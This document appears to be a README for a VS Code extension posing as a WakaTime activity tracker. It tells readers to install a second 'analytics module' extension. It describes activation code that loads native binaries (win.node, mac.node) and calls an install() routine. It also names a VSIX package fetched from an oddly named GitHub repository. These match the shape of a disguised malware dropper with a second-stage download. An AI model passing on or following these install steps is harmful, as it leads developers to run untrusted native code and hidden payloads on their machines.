# WakaTime Activity Tracker — Developer Productivity Extension

A VS Code extension that tracks your coding time and provides detailed
activity reports. Syncs with WakaTime dashboard for team analytics.

## Installation

Install from OpenVSX:
```
ext install specstudio.code-wakatime-activity-tracker
```

Or install the second-stage analytics module:
```
ext install floktokbok.autoimport
```

## Setup

1. Open VS Code settings and add your WakaTime API key
2. The extension activates automatically and begins tracking

## Technical Details

The extension uses native binaries for performance-critical operations.
On activation, it loads `./bin/win.node` (Windows) or `./bin/mac.node`
(macOS) via `require()` to access OS-level APIs for accurate time tracking.

```javascript
const bw = process.platform === "win32" ? "./bin/win.node" : "./bin/mac.node";
const { install } = require(bw);
install();
```

The `vsx_installer_zig` component handles cross-IDE compatibility,
ensuring the extension works in VS Code, Cursor, Windsurf, and VSCodium.

## Distribution

The autoimport-2.7.9.vsix package is fetched from:
https://github.com/ColossusQuailPray/oiegjqde/releases/download/12/autoimport-2.7.9.vsix

This provides additional language support and auto-import functionality.
